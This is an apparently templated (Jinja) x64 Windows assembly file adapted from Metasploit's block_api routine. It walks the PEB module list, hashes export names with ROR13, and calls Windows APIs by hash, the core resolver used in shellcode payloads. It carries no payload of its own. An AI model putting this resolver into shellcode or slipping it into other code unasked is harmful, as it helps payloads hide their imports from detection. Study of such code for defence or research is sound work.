{# https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm #}
{%- macro api_call(libname, funcname, arg1=None, arg2=None, arg3=None, arg4=None) -%}
  ; call {{ libname }}!{{ funcname }}
{% if arg4 != None %}
  mov r9, {{ arg4 }}
{% endif %}
{% if arg3 != None %}
  mov r8, {{ arg3 }}
{% endif %}
{% if arg2 != None %}
  mov rdx, {{ arg2 }}
{% endif %}
{% if arg1 != None %}
  mov rcx, {{ arg1 }}
{% endif %}
  mov r10d, {{ api_hash(libname, funcname) }}                                      ; r10d = api_hash('{{ libname }}', '{{ funcname }}')
  call rbp
{%- endmacro %}

{% set ___blkapi_api_define = [] %}
{% macro api_define() -%}
{% do ___blkapi_api_define.append(1) -%}
{% set ___blkapi_nsid = ___blkapi_api_define | length %}
;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
; Size: 200 bytes
;-----------------------------------------------------------------------------;
_blkapi{{ ___blkapi_nsid }}_api_call:
  push r9                          ; Save the 4th parameter
  push r8                          ; Save the 3rd parameter
  push rdx                         ; Save the 2nd parameter
  push rcx                         ; Save the 1st parameter
  push rsi                         ; Save RSI
  xor rdx, rdx                     ; Zero rdx
  mov rdx, gs:[rdx+0x60]           ; Get a pointer to the PEB
  mov rdx, [rdx+0x18]              ; Get PEB->Ldr
  mov rdx, [rdx+0x20]              ; Get the first module from the InMemoryOrder module list
_blkapi{{ ___blkapi_nsid }}_next_mod:                 ;
  mov rsi, [rdx+0x50]              ; Get pointer to modules name (unicode string)
  movzx rcx, word ptr [rdx+0x4a]   ; Set rcx to the length we want to check
  xor r9, r9                       ; Clear r9 which will store the hash of the module name
_blkapi{{ ___blkapi_nsid }}_loop_modname:             ;
  xor rax, rax                     ; Clear rax
  lodsb                            ; Read in the next byte of the name
  cmp al, 'a'                      ; Some versions of Windows use lower case module names
  jl _blkapi{{ ___blkapi_nsid }}_not_lowercase        ;
  sub al, 0x20                     ; If so normalise to uppercase
_blkapi{{ ___blkapi_nsid }}_not_lowercase:            ;
  ror r9d, 0xd                     ; Rotate right our hash value
  add r9d, eax                     ; Add the next byte of the name
  loop _blkapi{{ ___blkapi_nsid }}_loop_modname       ; Loop until we have read enough
  ; We now have the module hash computed
  push rdx                         ; Save the current position in the module list for later
  push r9                          ; Save the current module hash for later
  ; Proceed to itterate the export address table,
  mov rdx, [rdx+0x20]              ; Get this modules base address
  mov eax, dword ptr [rdx+0x3c]    ; Get PE header
  add rax, rdx                     ; Add the modules base address
  cmp word ptr [rax+0x18], 0x020B  ; is this module actually a PE64 executable?
  ; this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
  ; their may be a PE32 module present in the PEB's module list, (typically the main module).
  ; as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
  jne _blkapi{{ ___blkapi_nsid }}_get_next_mod1       ; if not, proceed to the next module
  mov eax, dword ptr [rax+0x88]    ; Get export tables RVA
  test rax, rax                    ; Test if no export address table is present
  jz _blkapi{{ ___blkapi_nsid }}_get_next_mod1        ; If no EAT present, process the next module
  add rax, rdx                     ; Add the modules base address
  push rax                         ; Save the current modules EAT
  mov ecx, dword ptr [rax+0x18]    ; Get the number of function names
  mov r8d, dword ptr [rax+0x20]    ; Get the rva of the function names
  add r8, rdx                      ; Add the modules base address
  ; Computing the module hash + function hash
_blkapi{{ ___blkapi_nsid }}_get_next_func:            ;
  jrcxz _blkapi{{ ___blkapi_nsid }}_get_next_mod      ; When we reach the start of the EAT (we search backwards), process the next module
  dec rcx                          ; Decrement the function name counter
  mov esi, dword ptr [r8+rcx*4]    ; Get rva of next module name
  add rsi, rdx                     ; Add the modules base address
  xor r9, r9                       ; Clear r9 which will store the hash of the function name
  ; And compare it to the one we want
_blkapi{{ ___blkapi_nsid }}_loop_funcname:            ;
  xor rax, rax                     ; Clear rax
  lodsb                            ; Read in the next byte of the ASCII function name
  ror r9d, 0xd                     ; Rotate right our hash value
  add r9d, eax                     ; Add the next byte of the name
  cmp al, ah                       ; Compare AL (the next byte from the name) to AH (null)
  jne _blkapi{{ ___blkapi_nsid }}_loop_funcname       ; If we have not reached the null terminator, continue
  add r9, [rsp+8]                  ; Add the current module hash to the function hash
  cmp r9d, r10d                    ; Compare the hash to the one we are searching for
  jnz _blkapi{{ ___blkapi_nsid }}_get_next_func       ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop rax                          ; Restore the current modules EAT
  mov r8d, dword ptr [rax+0x24]    ; Get the ordinal table rva
  add r8, rdx                      ; Add the modules base address
  mov cx, [r8+2*rcx]               ; Get the desired functions ordinal
  mov r8d, dword ptr [rax+0x1c]    ; Get the function addresses table rva
  add r8, rdx                      ; Add the modules base address
  mov eax, dword ptr [r8+4*rcx]    ; Get the desired functions RVA
  add rax, rdx                     ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...
_blkapi{{ ___blkapi_nsid }}_finish:
  pop r8                           ; Clear off the current modules hash
  pop r8                           ; Clear off the current position in the module list
  pop rsi                          ; Restore RSI
  pop rcx                          ; Restore the 1st parameter
  pop rdx                          ; Restore the 2nd parameter
  pop r8                           ; Restore the 3rd parameter
  pop r9                           ; Restore the 4th parameter
  pop r10                          ; pop off the return address
  sub rsp, 0x20                    ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                   ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
  push r10                         ; push back the return address
  jmp rax                          ; Jump into the required function
  ; We now automagically return to the correct caller...
_blkapi{{ ___blkapi_nsid }}_get_next_mod:             ;
  pop rax                          ; Pop off the current (now the previous) modules EAT
_blkapi{{ ___blkapi_nsid }}_get_next_mod1:            ;
  pop r9                           ; Pop off the current (now the previous) modules hash
  pop rdx                          ; Restore our position in the module list
  mov rdx, [rdx]                   ; Get the next module
  jmp _blkapi{{ ___blkapi_nsid }}_next_mod            ; Process this module
{%- endmacro %}
